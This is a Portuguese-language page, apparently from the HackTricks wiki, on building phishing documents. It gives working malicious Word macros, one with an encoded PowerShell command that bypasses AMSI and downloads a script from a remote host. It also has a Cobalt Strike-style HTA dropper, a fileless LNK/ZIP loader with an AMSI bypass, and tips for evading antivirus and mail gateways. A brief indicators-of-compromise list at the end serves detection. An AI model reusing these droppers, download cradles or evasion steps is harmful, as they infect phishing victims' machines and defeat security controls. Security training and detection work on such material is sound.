# Arquivos & Documentos de Phishing

{{#include ../../banners/hacktricks-training.md}}

## Documentos do Office

Microsoft Word realiza a validação dos dados do arquivo antes de abrir um arquivo. A validação dos dados é feita na forma de identificação da estrutura dos dados, em conformidade com o padrão OfficeOpenXML. Se ocorrer qualquer erro durante a identificação da estrutura dos dados, o arquivo sendo analisado não será aberto.

Normalmente, arquivos do Word que contêm macros usam a extensão `.docm`. No entanto, é possível renomear o arquivo alterando a extensão e ainda manter suas capacidades de execução de macros.\
Por exemplo, um arquivo RTF não suporta macros, por design, mas um arquivo DOCM renomeado para RTF será tratado pelo Microsoft Word e será capaz de executar macros.\
Os mesmos internos e mecanismos se aplicam a todo o software do Microsoft Office Suite (Excel, PowerPoint etc.).

Você pode usar o seguinte comando para verificar quais extensões serão executadas por alguns programas do Office:
```bash
assoc | findstr /i "word excel powerp"
```
Arquivos DOCX que fazem referência a um template remoto (File –Options –Add-ins –Manage: Templates –Go) que inclui macros podem “executar” macros também.

### Carregamento de Imagem Externa

Ir para: _Insert --> Quick Parts --> Field_\
_**Categorias**: Links e Referências, **Nomes de campo**: includePicture, e **Nome do arquivo ou URL**:_ http://<ip>/whatever

![](<../../images/image (155).png>)

### Macros Backdoor

É possível usar macros para executar código arbitrário a partir do documento.

#### Funções Autoload

Quanto mais comuns forem, maior a probabilidade de o AV detectá-las.

- AutoOpen()
- Document_Open()

#### Exemplos de Código de Macros
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### Remover metadados manualmente

Vá em **File > Info > Inspect Document > Inspect Document**, o que abrirá o Document Inspector. Clique em **Inspect** e depois em **Remove All** ao lado de **Document Properties and Personal Information**.

#### Extensão do Documento

When finished, select **Save as type** dropdown, change the format from **`.docx`** to **Word 97-2003 `.doc`**.\
Faça isso porque você não pode salvar macro's dentro de um **`.docx`** e há um **stigma** **around** a extensão habilitada para macros **`.docm`** (por exemplo, o ícone em miniatura tem um grande `!` e alguns gateways web/email os bloqueiam completamente). Portanto, essa **extensão legada `.doc` é o melhor compromisso**.

#### Geradores de Macros Maliciosos

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## Arquivos HTA

Um HTA é um programa do Windows que **combina HTML e linguagens de script (como VBScript e JScript)**. Ele gera a interface do usuário e é executado como uma aplicação "totalmente confiável", sem as restrições do modelo de segurança de um browser.

Um HTA é executado usando **`mshta.exe`**, que normalmente é **instalado** junto com o **Internet Explorer**, tornando **`mshta` dependente do IE**. Portanto, se ele tiver sido desinstalado, HTAs não poderão ser executados.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## Forçando Autenticação NTLM

Existem várias maneiras de **forçar NTLM authentication "remotely"**, por exemplo, você pode adicionar **imagens invisíveis** em emails ou HTML que o usuário acessará (até mesmo HTTP MitM?). Ou enviar para a vítima o **endereço de arquivos** que irão **acionar** uma **autenticação** apenas ao **abrir a pasta.**

**Confira essas ideias e mais nas páginas a seguir:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Não esqueça que você não pode apenas roubar o hash ou a autenticação, mas também realizar NTLM Relay attacks:

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (fileless chain)

Campanhas altamente eficazes entregam um ZIP que contém dois documentos legítimos de isca (PDF/DOCX) e um .lnk malicioso. O truque é que o loader do PowerShell real é armazenado dentro dos bytes brutos do ZIP após um marcador único, e o .lnk recorta e o executa totalmente em memória.

Fluxo típico implementado pelo one-liner PowerShell do .lnk:

1) Localizar o ZIP original em caminhos comuns: Desktop, Downloads, Documents, %TEMP%, %ProgramData%, e o diretório pai do diretório de trabalho atual.
2) Ler os bytes do ZIP e encontrar um marcador hardcoded (por exemplo, xFIQCV). Tudo após o marcador é o PowerShell payload embutido.
3) Copiar o ZIP para %ProgramData%, extrair lá, e abrir o .docx de isca para parecer legítimo.
4) Bypassar AMSI para o processo atual: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Deobfuscar a próxima etapa (por ex., remover todos os caracteres #) e executá-la em memória.

Exemplo de esqueleto PowerShell para extrair e executar a etapa embutida:
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
Notas
- A entrega frequentemente abusa de subdomínios PaaS reputados (por exemplo, *.herokuapp.com) e pode filtrar payloads (servir ZIPs benignos com base em IP/UA).
- A etapa seguinte frequentemente descriptografa base64/XOR shellcode e o executa via Reflection.Emit + VirtualAlloc para minimizar artefatos no disco.

Persistência usada na mesma cadeia
- COM TypeLib hijacking do Microsoft Web Browser control para que o IE/Explorer ou qualquer app que o incorpore re-execute o payload automaticamente. Veja detalhes e comandos prontos para uso aqui:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Hunting/IOCs
- Arquivos ZIP contendo a string marcador ASCII (por exemplo, xFIQCV) acrescentada aos dados do arquivo.
- .lnk que enumera pastas parent/user para localizar o ZIP e abre um documento de isca.
- Manipulação do AMSI via [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Threads de negócios de longa duração que terminam com links hospedados em domínios PaaS confiáveis.

## Referências

- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)

{{#include ../../banners/hacktricks-training.md}}
